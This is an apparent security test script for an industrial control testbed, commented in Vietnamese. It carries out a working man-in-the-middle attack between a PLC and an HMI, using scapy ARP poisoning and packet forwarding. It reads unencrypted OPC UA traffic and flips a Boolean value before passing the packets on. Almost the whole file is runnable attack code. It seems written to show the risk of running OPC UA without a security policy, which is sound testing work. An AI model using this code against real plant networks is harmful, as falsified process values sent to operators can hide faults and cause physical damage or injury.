#!/usr/bin/env python3
"""
tests/test_mitm_opcua_spoof.py
MitM Attack: ARP Poison + OPC UA Plaintext Read/Spoof
PLC (192.168.210.211:4840) <-> Attacker <-> HMI/Web-SCADA (192.168.210.31)

Khac voi test_mitm_s7_spoof.py (S7CommPlus, ma hoa -- khong doc duoc noi dung):
OPC UA tren testbed nay chay Anonymous/No-Security (da xac nhan qua
OPCUA_UNAUTHORIZED_SESSION va OPCUA_CERTIFICATE_REJECTED deu NOT_CONFIGURED
trong tests/day8/run_day8.py). Traffic la UA-TCP binary THUAN VAN BAN (khong
ma hoa), nen dung o vi tri MITM co the vua DOC duoc gia tri that vua THU sua
noi dung truoc khi forward cho HMI -- dung diem doi lap voi cho S7CommPlus
bi ma hoa chan lai.

QUAN TRONG - gioi han that cua script nay (khong phong dai):
manipulate_opcua_payload() dung heuristic quet byte tim 1 Variant kieu
Boolean (khong phai bo phan tich giao thuc day du). OPC UA khong lap lai ten
tag ("BangTai") trong ReadResponse/PublishResponse, nen khong the tim theo
ten tag bang pattern byte don gian -- chi tim duoc "1 gia tri Boolean nao do"
trong khung MSG, co the trung hoac khong trung dung BangTai tuy vi tri thuc
te trong response. modified_count la con so that duy nhat de biet co sua
duoc gi khong; ban co the >0 ma khong phai dung field mong muon. Muon chinh
xac hon: bat 1 phien PublishResponse that bang Wireshark, xac dinh offset
that cua BangTai trong cau truc do, roi hardcode offset (giong cach
test_mitm_s7_spoof.py da lam voi M5/M6/MD54 cho S7comm).

Yeu cau: pip install scapy, chay Admin (Windows) / sudo (Linux).

Bat IP forwarding truoc (tranh DoS ngoai y muon):
  Windows: netsh interface ipv4 set interface "Ethernet" forwarding=enabled
  Linux:   echo 1 > /proc/sys/net/ipv4/ip_forward
"""

import sys
import os
import time
import threading

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from tests.common import *  # noqa: F401,F403

try:
    from scapy.all import (
        ARP, Ether, IP, TCP, Raw,
        sendp, srp, sniff,
        get_if_hwaddr, getmacbyip
    )
except ImportError:
    print("[!] Thieu scapy: pip install scapy")
    sys.exit(1)

# ── Config ────────────────────────────────────────────────────────────────────
PLC_IP_CONF = PLC_IP
HMI_IP_CONF = HMI_IP
OPCUA_PORT  = 4840
DURATION    = int(os.getenv("MITM_OPCUA_DURATION_S", "60"))

stop_arp          = threading.Event()
intercepted_count = 0
modified_count    = 0

UA_MSG_TYPES = {b"HEL", b"OPN", b"MSG", b"CLO", b"ERR"}


# ── MAC helper ────────────────────────────────────────────────────────────────
def get_mac(ip):
    try:
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            timeout=2, verbose=False
        )
        return ans[0][1].hwsrc if ans else None
    except Exception:
        return None


# ── ARP Poison (giong het test_mitm_s7_spoof.py, da co restore) ──────────────
def arp_poison(plc_mac, hmi_mac, plc_ip, hmi_ip, iface):
    attacker_mac = get_if_hwaddr(iface)

    poison_to_hmi = Ether(dst=hmi_mac) / ARP(
        op=2, pdst=hmi_ip, hwdst=hmi_mac,
        psrc=plc_ip, hwsrc=attacker_mac
    )
    poison_to_plc = Ether(dst=plc_mac) / ARP(
        op=2, pdst=plc_ip, hwdst=plc_mac,
        psrc=hmi_ip, hwsrc=attacker_mac
    )

    print(f"[ARP] Poison started: PLC={plc_ip} <-> HMI={hmi_ip}")
    while not stop_arp.is_set():
        sendp(poison_to_hmi, iface=iface, verbose=False)
        sendp(poison_to_plc, iface=iface, verbose=False)
        time.sleep(1.5)


def restore_arp(plc_mac, hmi_mac, plc_ip, hmi_ip, iface):
    fix_hmi = Ether(dst=hmi_mac) / ARP(
        op=2, pdst=hmi_ip, hwdst=hmi_mac,
        psrc=plc_ip, hwsrc=plc_mac
    )
    fix_plc = Ether(dst=plc_mac) / ARP(
        op=2, pdst=plc_ip, hwdst=plc_mac,
        psrc=hmi_ip, hwsrc=hmi_mac
    )
    for _ in range(5):
        sendp(fix_hmi, iface=iface, verbose=False)
        sendp(fix_plc, iface=iface, verbose=False)
        time.sleep(0.3)
    print("[ARP] Da khoi phuc ARP table")


# ── OPC UA UA-TCP frame decode (tu extract_opcua_features.py) ────────────────
def decode_ua_header(raw: bytes) -> dict | None:
    """MessageType(3 ascii) + ChunkType(1) + MessageSize(4 LE)."""
    if len(raw) < 8:
        return None
    msg_type = raw[0:3]
    if msg_type not in UA_MSG_TYPES:
        return None
    return {
        "type": msg_type.decode(),
        "chunk": chr(raw[3]),
        "size": int.from_bytes(raw[4:8], "little"),
    }


def find_boolean_variant(body: bytes):
    """Heuristic: OPC UA Boolean Variant = TypeId byte 0x01 followed by a
    single 0x00/0x01 value byte. NOT a full parser -- first match only,
    may or may not be the field you actually want. See module docstring."""
    for i in range(len(body) - 1):
        if body[i] == 0x01 and body[i + 1] in (0x00, 0x01):
            return i + 1
    return None


def manipulate_opcua_payload(payload: bytes) -> bytes:
    """Best-effort: flip the first Boolean Variant found in a MSG payload."""
    global modified_count
    payload = bytearray(payload)
    header = decode_ua_header(bytes(payload))
    if not header or header["type"] != "MSG":
        return bytes(payload)

    body = payload[8:]
    offset = find_boolean_variant(bytes(body))
    if offset is None:
        return bytes(payload)

    original = body[offset]
    body[offset] = 0x00 if original else 0x01
    info(f"OPC UA SPOOF: Boolean byte 0x{original:02X} -> 0x{body[offset]:02X} "
         f"(heuristic match at body offset={offset}, not guaranteed = BangTai)")
    modified_count += 1
    payload[8:] = body
    return bytes(payload)


# ── Packet Callback ───────────────────────────────────────────────────────────
def packet_callback(pkt, plc_ip, hmi_ip, iface):
    global intercepted_count

    if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
        return

    src_ip = pkt[IP].src
    dst_ip = pkt[IP].dst
    sport = pkt[TCP].sport
    dport = pkt[TCP].dport

    if sport != OPCUA_PORT and dport != OPCUA_PORT:
        return

    intercepted_count += 1

    # PLC -> HMI: doc + thu sua roi forward
    if src_ip == plc_ip and dst_ip == hmi_ip and sport == OPCUA_PORT:
        if pkt.haslayer(Raw):
            raw = bytes(pkt[Raw].load)
            header = decode_ua_header(raw)
            if header:
                info(f"OPC UA {header['type']} PLC->HMI, {len(raw)}B (plaintext, decoded live)")
            modified_raw = manipulate_opcua_payload(raw)
            new_pkt = pkt.copy()
            new_pkt[Raw].load = modified_raw
            del new_pkt[IP].chksum
            del new_pkt[TCP].chksum
            hmi_mac = getmacbyip(hmi_ip)
            if hmi_mac:
                sendp(Ether(dst=hmi_mac) / new_pkt[IP], iface=iface, verbose=False)
        return  # khong fall-through

    # HMI -> PLC: forward nguyen
    if src_ip == hmi_ip and dst_ip == plc_ip:
        plc_mac = getmacbyip(plc_ip)
        if plc_mac:
            sendp(Ether(dst=plc_mac) / pkt[IP], iface=iface, verbose=False)


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    global intercepted_count, modified_count
    intercepted_count = 0
    modified_count = 0

    plc_ip = PLC_IP_CONF
    hmi_ip = HMI_IP_CONF
    iface = IFACE

    print(f"\n{B}[TEST] MITM OPCUA PLAINTEXT SPOOF — Bang truyen AGF{X}")
    info(f"PLC: {plc_ip}:{OPCUA_PORT}  HMI: {hmi_ip}  Duration: {DURATION}s")
    info("Doi lap voi test_mitm_s7_spoof.py: OPC UA khong ma hoa (Anonymous/No-Security)")

    changes = []
    observable = []
    notes = []
    error = None
    t0 = time.time()

    plc_mac = None
    hmi_mac = None

    try:
        info("Lay MAC address...")
        plc_mac = get_mac(plc_ip)
        hmi_mac = get_mac(hmi_ip)

        if not plc_mac:
            error = f"PLC {plc_ip} unreachable (no ARP reply)"
            fail(error)
            print_result("MITM_OPCUA_SPOOF", False, [], [], [error], time.time() - t0, error)
            return

        if not hmi_mac:
            error = f"HMI {hmi_ip} unreachable (no ARP reply)"
            fail(error)
            print_result("MITM_OPCUA_SPOOF", False, [], [], [error], time.time() - t0, error)
            return

        ok(f"PLC MAC : {plc_mac}")
        ok(f"HMI MAC : {hmi_mac}")

        if sys.platform.startswith("linux"):
            os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
            info("IP forwarding: ON")
        else:
            warn('Windows: xac nhan da chay "netsh interface ipv4 set interface ... forwarding=enabled" TRUOC lenh nay')

        arp_thread = threading.Thread(
            target=arp_poison,
            args=(plc_mac, hmi_mac, plc_ip, hmi_ip, iface),
            daemon=True
        )
        arp_thread.start()
        ok("ARP Poison thread started")
        time.sleep(2)

        filter_str = f"tcp port {OPCUA_PORT}"
        info(f"Sniffing [{filter_str}] for {DURATION}s ...")
        info("Wireshark filter: opcua || arp.duplicate-address-frame")

        sniff(
            filter=filter_str,
            prn=lambda pkt: packet_callback(pkt, plc_ip, hmi_ip, iface),
            timeout=DURATION,
            store=False,
            iface=iface
        )

    except KeyboardInterrupt:
        info("Dung boi user (Ctrl+C)")
    except Exception as e:
        error = str(e)
        fail(str(e))
    finally:
        stop_arp.set()
        time.sleep(1)
        if plc_mac and hmi_mac:
            try:
                restore_arp(plc_mac, hmi_mac, plc_ip, hmi_ip, iface)
            except Exception as e:
                warn(f"Restore ARP failed: {e}")
        if sys.platform.startswith("linux"):
            os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
            info("IP forwarding: OFF")

    duration = time.time() - t0

    observable.append(f"ARP Poison: PLC {plc_ip} <-> HMI {hmi_ip} qua attacker")
    observable.append(f"OPC UA intercepted: {intercepted_count} pkts")
    observable.append(f"OPC UA modified   : {modified_count} pkts")

    changes.append("Boolean Variant flip (heuristic, best-effort) trong 1 frame MSG PLC->HMI")

    notes.append(f"Duration   : {duration:.1f}s")
    notes.append(f"Intercepted: {intercepted_count} | Modified: {modified_count}")
    notes.append("Wireshark  : opcua || arp.duplicate-address-frame")
    notes.append(
        "modified_count=0 nghia la khong tim thay pattern Boolean trong cua so quan sat "
        "-- KHONG suy ra la khong the sua duoc noi dung, chi la heuristic chua khop lan nay. "
        "modified_count>0 khong dam bao dung field BangTai -- xem module docstring."
    )
    notes.append(
        "So sanh voi test_mitm_s7_spoof.py: neu intercepted_count o day cao (doc duoc plaintext "
        "de dang) trong khi ban S7CommPlus chi thay hex tho, day la bang chung truc tiep cho thay "
        "khong bat security policy OPC UA nguy hiem hon nhieu so voi S7CommPlus da ma hoa."
    )

    success = intercepted_count > 0
    print_result("MITM_OPCUA_SPOOF", success, changes, observable, notes, duration, error)


if __name__ == "__main__":
    main()
